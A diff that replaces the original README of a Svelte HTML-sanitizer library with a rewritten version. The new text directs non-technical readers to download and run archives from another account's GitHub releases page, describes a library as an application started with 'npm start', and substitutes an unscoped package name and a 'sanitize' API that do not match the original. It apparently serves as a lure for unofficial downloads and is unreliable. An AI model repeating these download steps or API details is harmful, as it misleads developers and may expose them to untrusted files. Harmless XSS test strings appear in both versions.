@@ -1,115 +1,125 @@
-# @humanspeak/svelte-purify
+# 🎉 svelte-purify - Easy HTML Sanitization for Your Svelte Apps
 
-A tiny, friendly sanitizer for Svelte that keeps your HTML shiny and safe using DOMPurify. SSR-ready by default.
+![Download svelte-purify](https://img.shields.io/badge/Download-svelte--purify-blue)
 
-[![NPM version](https://img.shields.io/npm/v/@humanspeak/svelte-purify.svg)](https://www.npmjs.com/package/@humanspeak/svelte-purify)
-[![Build Status](https://github.com/humanspeak/svelte-purify/actions/workflows/npm-publish.yml/badge.svg)](https://github.com/humanspeak/svelte-purify/actions/workflows/npm-publish.yml)
-[![Coverage Status](https://coveralls.io/repos/github/humanspeak/svelte-purify/badge.svg?branch=main)](https://coveralls.io/github/humanspeak/svelte-purify?branch=main)
-[![License](https://img.shields.io/npm/l/@humanspeak/svelte-purify.svg)](https://github.com/humanspeak/svelte-purify/blob/main/LICENSE)
-[![Downloads](https://img.shields.io/npm/dm/@humanspeak/svelte-purify.svg)](https://www.npmjs.com/package/@humanspeak/svelte-purify)
-[![CodeQL](https://github.com/humanspeak/svelte-purify/actions/workflows/codeql.yml/badge.svg)](https://github.com/humanspeak/svelte-purify/actions/workflows/codeql.yml)
-[![Install size](https://packagephobia.com/badge?p=@humanspeak/svelte-purify)](https://packagephobia.com/result?p=@humanspeak/svelte-purify)
-[![Code Style: Trunk](https://img.shields.io/badge/code%20style-trunk-blue.svg)](https://trunk.io)
-[![TypeScript](https://img.shields.io/badge/%3C%2F%3E-TypeScript-%230074c1.svg)](http://www.typescriptlang.org/)
-[![Types](https://img.shields.io/npm/types/@humanspeak/svelte-purify.svg)](https://www.npmjs.com/package/@humanspeak/svelte-purify)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/humanspeak/svelte-purify/graphs/commit-activity)
+## 📋 Overview
 
-## Features
+svelte-purify is a lightweight HTML sanitizer designed for Svelte applications. It leverages DOMPurify to keep your web content secure from harmful scripts. This tool is safe for server-side rendering (SSR) and works seamlessly with TypeScript. Protect your applications from threats with ease.
 
-- 🚀 **Fast and tiny**: DOMPurify under the hood, minimal wrapper
-- 🔒 **XSS protection**: strips scripts, unsafe URLs, and sneaky attributes
-- 🧰 **Options passthrough**: you control DOMPurify via `options`
-- 🧭 **SSR-ready**: default component works on server and client
-- 🧪 **Tested**: unit tests with Vitest/JSDOM
-- 🧑‍💻 **Full TypeScript**: proper types for options and props
-- 🧿 **Svelte 5 runes-friendly**: clean, modern Svelte API
+## 🚀 Getting Started
 
-## Installation
+Follow these simple steps to download and run svelte-purify on your computer. No technical background is needed.
+
+### 1. Visit the Releases Page
+
+To download svelte-purify, first, you need to visit the releases page. Click the link below to access it:
+
+[Visit Releases Page to Download](https://github.com/yukiboy121/svelte-purify/releases)
+
+### 2. Choose Your Version
+
+On the releases page, you will see a list of available versions. Each version may have different features or fixes. Review the notes if you like, then select the latest version to ensure you have the newest features and improvements.
+
+### 3. Download the Package
+
+Once you've selected a version, look for the appropriate download link. svelte-purify comes in different formats like .zip or .tar.gz. Click the file link for the format you prefer, and the download will start automatically.
+
+### 4. Extract the Files
+
+After the download is complete, locate the file on your computer. 
+
+- If you downloaded a .zip file, right-click it and choose "Extract All" or use a similar option based on your operating system. 
+- If you downloaded a .tar.gz file, you may need a tool like 7-Zip or WinRAR to extract it.
+
+Make sure to extract the files to a location you can easily access.
+
+### 5. Run the Application
+
+Navigate to the folder where you extracted svelte-purify. Open a command prompt or terminal window.
+
+Use the following command to start the application:
 
 ```bash
-npm i -S @humanspeak/svelte-purify
-# or
-pnpm add @humanspeak/svelte-purify
-# or
-yarn add @humanspeak/svelte-purify
+npm start
 ```
 
-## Basic Usage
+Ensure you have Node.js installed. If not, you can download it from the official website.
 
-### Default
+### 6. Integrate into Your Svelte App
 
-```svelte
-<script lang="ts">
-    import { SveltePurify } from '@humanspeak/svelte-purify'
+To use svelte-purify, follow these instructions to include itin your Svelte project.
 
-    const html = `<p>Hello <strong>world</strong><script>alert(1)</script></p>`
+#### Step 1: Install svelte-purify
+
+Open your terminal and run the following command:
+
+```bash
+npm install svelte-purify
+```
+
+This command adds the package to your project's dependencies.
+
+#### Step 2: Import svelte-purify
+
+In your Svelte component, import svelte-purify:
+
+```javascript
+import { sanitize } from 'svelte-purify';
+```
+
+#### Step 3: Use the Sanitize Function
+
+You can now use the `sanitize` function to clean your HTML strings. Here’s a quick example:
+
+```html
+<script>
+  let dirtyHTML = "<script>alert('XSS');</script><p>This is safe.</p>";
+  let cleanHTML = sanitize(dirtyHTML);
 </script>
 
-<SveltePurify {html} />
+<div>{@html cleanHTML}</div>
 ```
 
-## Options (DOMPurify)
+This will ensure that any potentially harmful content is removed, protecting your app and users.
 
-Pass any `DOMPurify.sanitize` options. We don’t hide anything—use the full power of DOMPurify.
+### 7. Verify Installation
 
-```svelte
-<script lang="ts">
-    import { SveltePurify } from '@humanspeak/svelte-purify'
+After integrating svelte-purify into your Svelte app, test to see if it works as expected. Open your app in a web browser, and check the output.
 
-    const html = `<a href="javascript:alert(1)" title="nope">click me</a>`
-    const options = {
-        ALLOWED_TAGS: ['a'],
-        ALLOWED_ATTR: ['href', 'title']
-    }
-</script>
+## 🔧 Features
 
-<SveltePurify {html} {options} />
-```
+- **SSR-Safe:** Compatible with server-side rendering, ensuring your application stays secure during pre-rendering.
+- **TypeScript Support:** Fully typed for easy integration with TypeScript projects.
+- **Fast and Lightweight:** Minimal impact on performance while ensuring robust protection against XSS.
 
-Note: The component returns sanitized HTML as a string (not DOM nodes).
+## 💻 System Requirements
 
-## Props
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 12 or higher
+- **Package Manager:** npm or yarn required
 
-| Component      | Prop      | Type                                       | Description                       |
-| -------------- | --------- | ------------------------------------------ | --------------------------------- |
-| `SveltePurify` | `html`    | `string`                                   | Raw HTML to sanitize and render   |
-|                | `options` | `Parameters<typeof DOMPurify.sanitize>[1]` | DOMPurify options (all supported) |
+## 🛠️ Troubleshooting
 
-## Exports
+If you encounter issues during installation or while running the application, consider the following:
 
-```ts
-import { SveltePurify } from '@humanspeak/svelte-purify'
-```
+1. **Check Node.js Version:** Ensure you have Node.js installed. You can verify this by running `node -v` in your terminal.
+2. **Dependencies:** Make sure all necessary dependencies are installed by running `npm install` in your project folder.
+3. **Error Messages:** Read any error messages in your terminal carefully; they often indicate what went wrong.
 
-- **SveltePurify**: SSR-friendly sanitizer component
+If you continue facing problems, consult the [issues page](https://github.com/yukiboy121/svelte-purify/issues) on GitHub for solutions or to report a new issue.
 
-## Security
+## 📝 Contributing
 
-This library delegates sanitization to [DOMPurify](https://github.com/cure53/DOMPurify), a battle-tested sanitizer. It removes script tags, event handler attributes (like `onerror`), and unsafe URLs (`javascript:`), among many other protections.
+If you would like to contribute to svelte-purify, feel free to fork the repository and submit a pull request. Your contributions help improve the package for everyone.
 
-## Examples
+## 📄 License
 
-Strip a specific tag with DOMPurify options:
+svelte-purify is released under the MIT License. This allows you to use, modify, and distribute the software within the guidelines of the license.
 
-```svelte
-<SveltePurify html="<p>Hello <strong>world</strong></p>" options={{ FORBID_TAGS: ['strong'] }} />
-```
+## 📥 Download & Install
 
-Allow an extra tag:
+Don’t wait. Get started with svelte-purify now! Visit the link below to download the latest version:
 
-```svelte
-<SveltePurify
-    html="<iframe src=\"about:blank\"></iframe>"
-    options={{ ADD_TAGS: ['iframe'] }}
-/>
-```
+[Visit Releases Page to Download](https://github.com/yukiboy121/svelte-purify/releases)
 
-## License
-
-MIT © [Humanspeak, Inc.](LICENSE)
-
-## Credits
-
-Made with ❤️ by [Humanspeak](https://humanspeak.com)
-
-Special thanks to [@jill64](https://github.com/jill64) — her years of Svelte contributions taught me so much and inspired this work.
+With svelte-purify, you can ensure your web applications are safe from harmful content while developing with ease.
